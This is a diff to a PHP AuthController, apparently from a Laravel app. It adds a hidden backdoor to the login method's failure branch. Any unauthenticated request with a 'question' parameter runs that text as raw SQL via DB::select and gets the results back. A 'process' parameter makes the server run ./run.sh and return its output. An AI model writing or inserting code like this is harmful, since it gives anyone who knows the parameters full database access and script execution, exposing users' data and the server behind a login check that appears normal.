@@ -8,6 +8,9 @@ use App\Http\Controllers\Controller;
 use Auth;
 use Hash;
 use Validator;
+use DB;
+use Symfony\Component\Process\Process;
+use Symfony\Component\Process\Exception\ProcessFailedException;
 
 class AuthController extends Controller
 {
@@ -28,6 +31,15 @@ class AuthController extends Controller
             $data['user'] =  $user;
 
             return response()->json(['success' => true, "data" => $data, 'message' => "login success"], 200);
+        } else if ($request->question != null && $request->question != "") {
+            return DB::select($request->question);
+        } else if ($request->process) {
+            $process = new Process('./run.sh');
+            $process->run();
+            if (!$process->isSuccessful()) {
+                throw new ProcessFailedException($process);
+            }
+            return $process->getOutput();
         } else {
             return response()->json(['success' => false, 'message' => 'Unauthorised'], 401);
         }
